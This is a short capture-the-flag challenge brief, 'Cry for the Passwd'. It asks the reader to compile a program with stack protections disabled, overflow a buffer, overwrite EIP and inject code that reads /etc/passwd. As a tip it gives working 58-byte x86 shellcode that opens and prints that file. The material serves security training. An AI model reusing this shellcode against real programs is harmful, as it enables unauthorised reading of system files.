Challenge 1
-------------------------------------
    Challenge Name    : Cry for the Passwd
    Challenge Concept : Reading /etc/passwd file with no authorization 

Compile Program with 

	-fno-stack-protector -m32 -no-pie -g -z execstack

**TASKS**

Find vulnerable payload size

Overwrite EIP and Determine RA & Inject Code

Read /etc/passwd from gdb 

Good LUCK !!

TIP
--------
    58 BYTE
    char *shellcode =
    "\x31\xc9\x31\xc0\x31\xd2\x51\xb0\x05\x68\x73\x73\x77\x64\x68\x63\x2f\x70\x61\x68\x2f\x2f\x65\x74\x89\xe3\xcd\x80\x89\xd9\x89\xc3\xb0\x03\x66\xba\xff\x0f\x66\x42\xcd\x80\x31\xc0\x31\xdb\xb3\x01\xb0\x04\xcd\x80\x31\xc0\xb0\x01\xcd\x80";

